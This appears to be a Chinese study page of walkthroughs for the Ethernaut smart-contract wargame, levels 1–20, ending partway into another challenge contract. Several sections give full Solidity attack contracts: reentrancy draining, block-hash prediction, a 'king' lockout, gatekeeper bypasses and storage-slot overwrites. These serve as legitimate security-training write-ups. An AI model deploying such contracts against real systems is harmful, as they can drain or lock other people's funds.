<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>solidity语言学习</title>
    </head>
  <body>
        <h1>solidity语言学习</h1> 
		<h2>ethernaut靶场刷题</h2>
	    <h3>1.Hello Ethernaut</h3>
		<p>按照要求在控制台输入指定内容即可</p>
		<p>合约交互包含player和contract，player代表用户钱包地址，contract包含合约实列abi，address以及方法等信息。</p>
		<p>第一步调用contract.info(),查看结果可知:</p>
		<p>第二步调用contract.info1(),查看结果可知:</p>
		<p>第三步调用contract.info2('hello'),查看结果可知:</p>
		<p>第四步调用contract.infoNum(),查看结果可知:</p>
		<p>第五步调用contract.info42(),查看结果可知:</p>
		<p>第六步调用contract.theMethodName(),查看结果可知:</p>
		<p>第七步调用contract.method7123949(),查看结果可知:</p>
		<p>第八步调用contract.password(),查看结果可知:</p>
		<p>第九步调用contract.authenticate(authenticate0),结束游戏</p>
		<img src="https://yexingyu123456.github.io/photograph/Ethernaut2.png">
		<br><br>
		<br><br>
		<br><br>
		<h3>2.Fallback</h3>
		<p>题目要求:获得合约所有权并把余额清零</p>
		<p>题目合约:</p>
		<img src="https://yexingyu123456.github.io/photograph/Ethernaut1.png">
		<p>观察可知:</p>
		<p>创建合约后 owner 有 1000ether ,调用 contribute() 需要转入超过 owner 的量即可改变 owner ,但是要求 msg.value 小于 0.001 ether </p>
		<p>receive() 要求合约调用者的 ether 大于0,所以需要先调用一次 contribute() 函数,然后向合约发送任意 ether 即可改变 owner </p>
		<p>成为 owner 后,调用 withdraw() 即可清空合约 ether </p>
		<p>第一步调用contract.contribute({value:1})向合约发送1wei</p>
		<p>第二步调用contract.sendTransaction({value:1})向合约发送1wei,或直接使用钱包向合约转账,成为owner</p>
		<p>第三步调用contract.withedraw()即可清空合约ether,游戏结束</p>
		<br><br>
		<br><br>
		<br><br>
		<h3>3.Fallout</h3>
		<p>题目要求:获取合约所有权</p>
		<p>题目合约:</p>
		<img src="https://yexingyu123456.github.io/photograph/ethernaut3.png">
		<p>观察合约内容:</p>
		<p>function Fallout 为与合约同名的构造函数,在部署合约时调用1次,但此处为function fal1out 可以直接调用</p>
		<p>第一步调用contract.Fal1out   结束游戏</p>
		<br><br>
		<br><br>
		<br><br>
		<h3>4.Coin Flip</h3>
		<p>题目要求:</p>
		<p>连续猜中十次</p>
		<p>题目合约:</p>
		<img src="https://yexingyu123456.github.io/photograph/Ethernaut4.png">
		<br><br>
		<a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html">查看solidity文档</a>
		
		<p>blockhash(uint blockNumber) returns (bytes32)：指定区块的区块哈希 —— 仅可用于最新的 256 个</p>
		<p>根据合约,需要根据block.number(当前区块号)进行预测</p>
		<P>由    if (lastHash == blockValue) {</P>
			<p>revert();</p>
		  <p>}中的内容可知,同一个区块不可以调用两次Flip()</p>
		  <p>根据题目的计算方法,先将结果计算出来再调用flip()函数</p>
		<p>编写如下攻击合约</p>
	<textarea cols="140" rows="12">
			contract Attack {
				uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
				function attack(address _Flip) public returns (bool) {
					CoinFlip coinflip = CoinFlip(_Flip);
					uint256 blockValue = uint256(blockhash(block.number - 1));
					uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
					bool side = coinFlip == 1 ? true : false;
					coinflip.flip(side);
					return side;
				} 
			}
			
		</textarea>
		<p>放入题目合约中</p>
		<pre><code>
			// SPDX-License-Identifier: MIT
			pragma solidity ^0.8.0;
			
			contract CoinFlip {
			
			  uint256 public consecutiveWins;
			  uint256 lastHash;
			  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
			
			  constructor() {
				consecutiveWins = 0;
			  }
			
			  function flip(bool _guess) public returns (bool) {
				uint256 blockValue = uint256(blockhash(block.number - 1));
			
				if (lastHash == blockValue) {
				  revert();
				}
			
				lastHash = blockValue;
				uint256 coinFlip = blockValue / FACTOR;
				bool side = coinFlip == 1 ? true : false;
			
				if (side == _guess) {
				  consecutiveWins++;
				  return true;
				} else {
				  consecutiveWins = 0;
				  return false;
				}
			  }
			}
			contract Attack {
				uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
				function attack(address _Flip) public returns (bool) {
					CoinFlip coinflip = CoinFlip(_Flip);
					uint256 blockValue = uint256(blockhash(block.number - 1));
					uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
					bool side = coinFlip == 1 ? true : false;
					coinflip.flip(side);
					return side;
				} 
			}
					
		</code></pre>
		<p>在remix使用injected web3环境部署合约,然后填入被攻击合约的地址即可。调用10次attack(被攻击合约的地址),直到consecutiveWins为10,结束游戏</p>
		<br><br><br><br>
		<h3>5.Telephone</h3>
		<p>题目要求:</p>
		<p>获得合约所有权</p>
		<p>题目合约:</p>
		<img src="https://yexingyu123456.github.io/photograph/ethernaut5.png">
		<p>题目中msg.sender是合约调用者的地址[msg.sender ( address ): 消息发送者（当前调用）]</p>
		<p>[tx.origin ( address ): 交易发起者（完全的调用链）]</p>
		<p>由此创建一个合约进行调用即可满足(tx.origin != msg.sender)</p>
		<p>创建如下合约,已经知道原合约代码直接复制使用即可。否则可以使用interface进行调用</p>
		<img src="https://yexingyu123456.github.io/photograph/Ethernaut5.png">
		<p>部署合约时填入题目合约的地址,调用attack时填入自己钱包地址,完成后即可改变owner,游戏结束</p>
		<br><br><br><br>
		<h3>6.Token</h3>
		<p>题目要求:</p>
		<p>增加自己的Token</p>
		<p>题目合约:</p>
		<img src="https://yexingyu123456.github.io/photograph/Ethernaut6.png">
		<p>查看transfer后可知:</p>
		<p>对 require(balances[msg.sender] - _value >= 0)的要求,现在msg.sender所对应的Token有20个,如果让——value大于20就会发生向下溢出满足该要求</p>
		<p>如果转账给自己,又会发生向上溢出,相当于没有转账。所以:</p>
		<p>第一步调用contract.transfer函数,address填除了自己以外的任意地址,Value的值大于20即可</p>
		<p>第二步调用contract.balanceOf(player)查看自己的Token,如果变得很大则游戏结束</p>
		<br><br><br><br>
		<h3>7.Delegation</h3>
		<p>题目要求:</p>
		<p>获取到Delegation的owner</p>
		<p>题目合约:</p>
		<img src="https://yexingyu123456.github.io/photograph/Ethernaut7.png">
		<p>Delegation中有fallback函数,delegatecall可以使用合约delegate的pwn函数更换owner</p>
		<p>call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。</p>
        <p>delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。</p>
        <p>callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境</p>
		<a href="https://learnblockchain.cn/docs/web3.js/web3-utils.html#sha3">web3-utils内容</a>
		<p>sendTransaction中的参数</p>
		<pre><code>
			from: DATA, 20字节 - 发送交易的源地址
			to: DATA, 20字节 - 交易的目标地址，当创建新合约时可选
			gas: QUANTITY - 交易执行可用gas量，可选整数，默认值90000，未用gas将返还。
			gasPrice: QUANTITY - gas价格，可选，默认值：待定(To-Be-Determined)
			value: QUANTITY - 交易发送的金额，可选整数
			data: DATA - 合约的编译带啊或被调用方法的签名及编码参数
			nonce: QUANTITY - nonce，可选。可以使用同一个nonce来实现挂起的交易的重写</code></pre>
			<p>第一步:调用contract.sendTransaction({data:web3.utils.keccak256("pwn()").slice(0,10)})</p>
			<p>其中slice表示取10   length</p>
			<p>调用完成后和获取到owner</p>
			<br><br><br><br><br>
			<h3>8.Force</h3>
			<p>题目如下</p>
            <pre><code>
                
有些合约就是拒绝你的付款,就是这么任性 ¯\_(ツ)_/¯

这一关的目标是使合约的余额大于0

  这可能有帮助:

Fallback 方法
有时候攻击一个合约最好的方法是使用另一个合约.
阅读上方的帮助页面, "Beyond the console" 部分
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
            </code></pre>
            <p>由于不知道force中合约内部函数的内容，如果有fallback函数，那么久可以向合约转账，尝试转账但是失败了</p>
            <p>可以利用合约自毁强制向合约中转账</p>
            <p>编写如下攻击合约</p>
            <img src="https://yexingyu123456.github.io/photograph/ethernaut8.png">
            <p>部署攻击合约，攻击合约的自毁函数selfdestruct(payable(addr))会将合约中的代币全部转入目标合约addr中</p>
            <p>完成游戏</p>
    <br><br><br><br>

            <h3>9.Vault</h3>
            <p>题目合约:</p>
            <pre><code>
                打开 vault 来通过这一关!

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
            </code></pre>
            <p>要解锁合约，需要得到password</p>
            <a href="https://learnblockchain.cn/docs/web3.js/web3-eth.html#getstorageat">查看solidity文档</a>
            <p>插槽solt:</p>
            <p>以太坊数据数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个数组中。数组中的每个每个元素称为插槽(slot),其初始值为0，每个插槽可以存储32个字节</p>
            <p>对于值类型，其存放是连续的，满足如下规律</p>
            <pre><code>
                        对于值类型的存储规则（除去映射，动态数组，bytes和string）：

               存储插槽storage slot 的第一项会以低位对齐（即右对齐）的方式储存。
               基本类型仅使用存储它们所需的字节。
               如果 存储插槽storage slot 中的剩余空间不足以储存一个基本类型，那么它会被移入下一个 存储插槽storage slot 。
               结构体（struct）和数组数据总是会占用一整个新插槽（但结构体或数组中的各项，都会以这些规则进行打包）。
               </code></pre>
               <a href="https://blog.csdn.net/rfrder/article/details/115706983">----------相关文章-----------</a>
               <p>对于本题目:</p>
               <p>locked占1byte，在solt 0 的位置，password占32byte，在solt 1 的位置</p>
               <p>第一步调用   await web3.eth.getStorageAt(contract.address,1)  获取byte32 password</p>
               <p>得到password后，第二步调用    contract.unlock(   )   括号中为得到的password</p>
               <p>可以调用  await contract.locked()来查看是否解锁成功，结束游戏</p>
            <br><br><br><br>
            <h3>10.king</h3>
            <p>题目如下</p>
            <pre><code>
                下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.

这么有趣的游戏, 你的目标是攻破他.

当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
            </code></pre>
            <p>观察合约可知：</p>
            <p>合约的receive函数中当一个人发送了比当前合约prize大的金额，就会取代当前的king。只要在成为king后不接受转账就可以一直是king</p>
            <p>编写如下攻击合约</p>
            <pre><code>
                // SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;
contract attackking{
    constructor() public payable {}
    

    function attack(address payable addr) public payable{
        addr.call{value:0.002 ether}("");
    }

        receive() external payable{
            revert();
        }
    }
    <p>创建合约时传入一些ether，填入目标地址调用即可</p>
            </code></pre>
            <br><br><br><br>
            <br>
            <h3>11.re-entrancy</h3>
            <p>题目如下：</p>
            <pre><code>
                // SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
            </code></pre>
            <p>从合约中的withdraw函数入手</p>
            <p>合约需要在调用者大于值时调用call来</p>
            <p>编写如下合约：</p>
            <pre><code>
                contract attack_{
                    Reentrance re;
                    uint public balance;
                    uint money;
                    constructor (address payable _addr) public {
                        re = Reentrance(_addr);
                    }
                    function donate() public payable {
                        money = msg.value;
                        re.donate{value:money}(address(this));
                        
                    }
                    function withdraw() public{
                        re.withdraw(money);
                    }
                    fallback() external payable{
                        balance = address(re).balance;
                        if(balance>0)
                        {
                            if(balance>=money){
                                re.withdraw(money);
                            }else{
                                re.withdraw(balance);
                            }
                        }
                    }
                }
            </code></pre>
            <p>转入后提取，在合约内将eth转出后fallback再执行withdraw绕过if的判定，直到把eth全部转出</p>
            <br><br><br><br><br>
            <h3>12.Elevator</h3>
            <p>题目合约</p>
            <pre><code>
                // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
            </code></pre>
            <p>分析合约，使top变成true即可</p>
            <p>编写如下合约：</p>
            <pre><code>
                contract attack_ is Building{
                    bool top=false;
                    Elevator elevator;
                    constructor (address addr){
                        elevator = Elevator(addr);
                    }
                    function isLastFloor(uint) external override returns (bool){
                        top = !top;
                        return top;
                    }
                    function attack()public {
                        elevator.goTo(1);
                    }
                }

            </code></pre>
            <p>我们继承Building合约，并对其中的isLastFloor进行重写，使得每次调用isLastFloor时都会时top在true和false之间发生变化</p>
            <p>然后在攻击合约中调用goTo()，调用attack函数，然后就可以完成关卡了</p>
            <br><br><br><br><br><br>
            <h3>13.Privacy</h3>
            <p>合约如下</p>
            <pre><code>

                // SPDX-License-Identifier: MIT
                pragma solidity ^0.8.0;
                
                contract Privacy {
                
                  bool public locked = true;
                  uint256 public ID = block.timestamp;
                  uint8 private flattening = 10;
                  uint8 private denomination = 255;
                  uint16 private awkwardness = uint16(block.timestamp);
                  bytes32[3] private data;
                
                  constructor(bytes32[3] memory _data) {
                    data = _data;
                  }
                  
                  function unlock(bytes16 _key) public {
                    require(_key == bytes16(data[2]));
                    locked = false;
                  }
                
                  /*
                    A bunch of super advanced solidity algorithms...
                
                      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
                      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
                      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
                      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
                      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
                  */
                }

            </code></pre>
            <p>根据storage的存储原理</p>
            <p>如下：</p>
            <pre><code>

              loced 占用1，空32                                                solt 0；
              ID  占用32，空0                                                  slot 1；
              flattening 占用1 denomination 占用1 awkwardness 占用2，空28；    slot 2；
              data[0]   占用32，空0                                            slot 3；
              data[1]   占用32，空0                                            slot 4；
              data[2]   占用32，空0                                            slot 5；

            </code></pre>
            <p>需要的是data[2]的数据</p>
            <p>通过web3.eth.getStorageAt()方法来获取slot 5的数据</p>
            <p>由于需要的是bytes16的类型，调用contract.unlock时将获取到的bytes32类型使用slice(0,34)即可.(0x占2个数字，32+2=34)</p>
			<br>
            <br><br><br><br><br>
            <h3>14.Gatekeeper One</h3>
            <p>题目如下</p>
            <pre><code>

                越过守门人并且注册为一个参赛者来完成这一关.

                这可能有帮助:
                想一想你在 Telephone 和 Token 关卡学到的知识.
                你可以在 solidity 文档中更深入的了解 gasleft() 函数 (参见 here 和 here).
                // SPDX-License-Identifier: MIT
                pragma solidity ^0.8.0;
                
                contract GatekeeperOne {
                
                  address public entrant;
                
                  modifier gateOne() {
                    require(msg.sender != tx.origin);
                    _;
                  }
                
                  modifier gateTwo() {
                    require(gasleft() % 8191 == 0);
                    _;
                  }
                
                  modifier gateThree(bytes8 _gateKey) {
                      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
                      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
                      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
                    _;
                  }
                
                  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
                    entrant = tx.origin;
                    return true;
                  }
                }

            </code></pre>
            <p>要求：1.最初调用者不是合约调用者</p>
            <p>2.剩余gas对8191取余数为0</p>
            <p>3.要求（1）：8字节（16进制16位）转化为4字节，后8位为0==前4位（2字节），后12位为0</p>
            <p>(2):8字节（16进制16位）转化为4字节，后8位为0！= 16位</p>
            <p>(3):8字节（16进制16位）转化为4字节，后8位为0==最初调用者地址转化为uint160在转化位uint16，2位</p>
            <p>总结这三点，即前4位为tx.origin的数据，第5到8为0，后面8位不全为0。我们可以将其设为 0xaaaaaaaa0000aaaa</p>
            <p>编写攻击合约如下</p>
            <pre><code>

                contract _attack{
                    GatekeeperOne gatekeeperOne;
                constructor(address addr) public { //addr为攻击目标地址 
                      gatekeeperOne=GatekeeperOne(addr); 
            }
             function attack() public {
                bytes8 key = 0xaaaaaaaa0000d053;
                  for (uint256 i = 0; i < 8191; i++) {
                      (bool result,) = address(gatekeeperOne).call{gas:i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",key));
                      if (result) {
                          break;
                      }
                  }
            }
            }

            </code></pre>
            <p>调用getkey，得到gatekey后调用attack()，查看气体消耗，调整gas限制，直到调用成功为止</p>
            <br><br><br><br><br><br><br><br><br><br>






            <h3>15.Gatekeeper Two</h3>
            <p>合约如下</p>
            <pre><code>

                想一想你从上一个守门人那学到了什么.
第二个门中的 assembly 关键词可以让一个合约访问非原生的 vanilla solidity 功能. 参见 here . extcodesize 函数可以用来得到给定地址合约的代码长度 - 你可以在这个页面学习到更多 yellow paper.
^ 符号在第三个门里是位操作 (XOR), 在这里是代表另一个常见的位操作 (参见 here). Coin Flip 关卡也是一个很好的参考.
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

            </code></pre>
            <p>分析合约：
                extcodesize是用来检查地址是不是合约地址的：

                caller 为合约时，获取的大小为合约字节码大小，caller 为账户时，获取的大小为 0 。</p>
                <p>经过研究发现，当合约在初始化，还未完全创建时，代码大小是可以为0的。因此，我们需要把攻击合约的调用操作写在 constructor 构造函数中。

                    因此只要把攻击代码写在constructor里面就可以了。</p>
                    <pre><code>
                     攻击合约：

                     contract attack {
                        bytes8 public gateKey;
                        constructor(address target) public {
                            gateKey = bytes8(~(uint64(bytes8(keccak256(abi.encodePacked(this))))));
                            target.call(abi.encodeWithSignature("enter(bytes8)",gateKey));
                        }
                    }
                    在创建合约时填入被攻击合约的地址。
                    abi编码  
                    abi.encode(…) returns (bytes)：计算参数的 ABI 编码。
                    abi.encodePacked(…) returns (bytes)：计算参数的紧密打包编码
                    abi. encodeWithSelector(bytes4 selector, …) returns (bytes)： 计算函数选择器和参数的 ABI 编码
                    abi.encodeWithSignature(string signature, …) returns (bytes): 等价于* abi.encodeWithSelector(bytes4(keccak256(signature), …)
                    函数选择器，官方文档定义如下：
                    一个函数调用数据的前 4 字节，指定了要调用的函数。这就是某个函数签名的 Keccak（SHA-3）哈希的前 4 字节（高位在左的大端序）
                    （译注：这里的“高位在左的大端序“，指最高位字节存储在最低位地址上的一种串行化编码方式，即高位字节在左）。 这种签名被定义为基础原型的规范表达，
                    基础原型即是函数名称加上由括号括起来的参数类型列表，参数类型间由一个逗号分隔开，且没有空格。
                    
                    </code></pre>
                    <p>调用attack即可</p>
                    <br><br><br><br><br><br><br><br>
                    <h3>16.Naught Coin</h3>
                    <p>合约如下</p>
                    <pre><code>

                        NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。

                        这可能有用
                      
                      ERC20标准
                      OpenZeppelin仓库
                      // SPDX-License-Identifier: MIT
                      pragma solidity ^0.8.0;
                      
                      import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';
                      
                       contract NaughtCoin is ERC20 {
                      
                        // string public constant name = 'NaughtCoin';
                        // string public constant symbol = '0x0';
                        // uint public constant decimals = 18;
                        uint public timeLock = block.timestamp + 10 * 365 days;
                        uint256 public INITIAL_SUPPLY;
                        address public player;
                      
                        constructor(address _player) 
                        ERC20('NaughtCoin', '0x0') {
                          player = _player;
                          INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
                          // _totalSupply = INITIAL_SUPPLY;
                          // _balances[player] = INITIAL_SUPPLY;
                          _mint(player, INITIAL_SUPPLY);
                          emit Transfer(address(0), player, INITIAL_SUPPLY);
                        }
                        
                        function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
                          super.transfer(_to, _value);
                        }
                      
                        // Prevent the initial owner from transferring tokens until the timelock has passed
                        modifier lockTokens() {
                          if (msg.sender == player) {
                            require(block.timestamp > timeLock);
                            _;
                          } else {
                           _;
                          }
                        } 
                      } 

                    </code></pre>
                    <p>分析合约可知</p>
                    <pre><code>
                    在ERC20中，先允许我们自己获得转账额度，然后再转账即可
                    在remix中部署好实列合约，先调用approve函数，填入自己的钱包地址和额度；
                    调用transferfrom来转账。填入转账地址和目标地址以及数目后调用函数即可
                        
                    </code></pre>
                    <p>完成本关卡</p>
                    <br><br><br><br><br><br>
                    <h3>17.Preservation</h3>
                    <p>题目合约：</p>
                    <pre><code>
                        // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
                    </code></pre>
                    <p>分析合约，我们可以改变槽中的数据</p>
                    <p>调用setFirstTime时会delegatecall一次，会改变slot0中的数据，而slot0对应的是setFirstTime的地址</p>
                    <p>所以写攻击合约时写出setTime函数，并在其中改变owner（位置在slot2），在setFirstTime填入攻击合约的地址后就可以修改slot2的内容了</p>
                    <p>修改完成后完成关卡</p>
                    <br><br><br><br><br><br><br>


            <h3>18.Recovery</h3>
            <h3>题目合约：</h3>
            <pre><code>
                // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
            </code></pre>
            <p>分析合约：</p>
            <p>合约在创建后并没有设置用于接收地址的参数，导致地址丢失，我们可以通过计算获得地址，或者直接在区块上查看新创建的合约地址</p>
            <p>在区块链上查得合约地址后在remix中调用destroy即可通过关卡</p>
			<br>
            <br><br> <br><br> <br><br> <br><br> <br><br> <br><br>
            <h3>19.MagicNumber</h3>
            <p>题目合约：</p>
            <pre><code>
                // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {

  address public solver;

  constructor() {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}
            </code></pre>
            <p>这道题中还有很多地方没搞懂</p>
            <p><a href="https://stermi.medium.com/the-ethernaut-challenge-18-solution-magic-number-2cb8edee383a">还在学习中</a></p>
            <p>根据计算结果，调用方式如图</p>
            <img src="https://yexingyu123456.github.io/photograph/Ethernaut19.png">
            <p>完成后即可结束关卡</p>

            <br> <br><br> <br><br> <br><br> <br><br> <br>
            <h3>20.Alien Codex</h3>
            <p>题目合约：</p>
            <pre><code>
                // SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
            </code></pre>
            <p>编译需要在remix中引入Ownable-05.sol文件。</p>
            <p>引入后写如下攻击合约</p>
            <pre><code>
                contract attack_ {
                    AlienCodex alienCodex;
                   constructor(address addr)public{
                     
                     alienCodex =  AlienCodex(addr);
                       
                                                  }
                   function attack() public {
                       alienCodex.make_contact();        
                       alienCodex.retract();    
                       uint index = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(1))));
                      alienCodex.revise(index, bytes32(uint256(uint160(msg.sender))));
                                            }

                                 }

            </code></pre>
            <p>根据题目，可以发现直接调用retract()会发生越界，利用这点可以达成修改数据的目的</p>
            <p>由于每个函数都有contacted修饰符，需要调用make_contact()越过检查</p>
            <p>计算出插槽位置，然后调用revise()修改数据即可。（注意计算方法）</p>
			<br>
			<br>
			<br>
			<br>
			<br>
            <br>
            <br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<h2>其他练习题目</h2>
			<h3>Copy_wallet.sol</h3>
			<p>题目如下:</p>
			<pre><code>
			//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@openzeppelin/contracts-upgradeable/utils/StorageSlotUpgradeable.sol";
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract ERC20 is IERC20 {

    string public constant name = "ERC20";
    string public constant symbol = "ERC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;

    uint256 totalSupply_ = 10 ether;
   constructor() {
    balances[msg.sender] = totalSupply_;
    }
    function totalSupply() public override view returns (uint256) {
    return totalSupply_;
    }
    function balanceOf(address tokenOwner) public override view returns (uint256) {
        return balances[tokenOwner];
    }
    function transfer(address receiver, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender]-numTokens;
        balances[receiver] = balances[receiver]+numTokens;
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }
    function approve(address delegate, uint256 numTokens) public override returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }
    function allowance(address owner, address delegate) public override view returns (uint) {
        return allowed[owner][delegate];
    }
    function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[owner]);
        require(numTokens <= allowed[owner][msg.sender]);

        balances[owner] = balances[owner]-numTokens;
        allowed[owner][msg.sender] = allowed[owner][msg.sender]-numTokens;
        balances[buyer] = balances[buyer]+numTokens;
        emit Transfer(owner, buyer, numTokens);
        return true;
    }
}

contract wallet {
    struct Wallet{
        string walletName;
        uint256 uniqueTokens;
        mapping(address => uint256)balances;
    }
    struct Slot{
        bytes32 value;
    }
    mapping(address => Wallet[])public wallets;
    ERC20 public fake;
    event SendFlag(string email);
    constructor(){
        fake = new ERC20();
        
        wallets[address(this)].push();
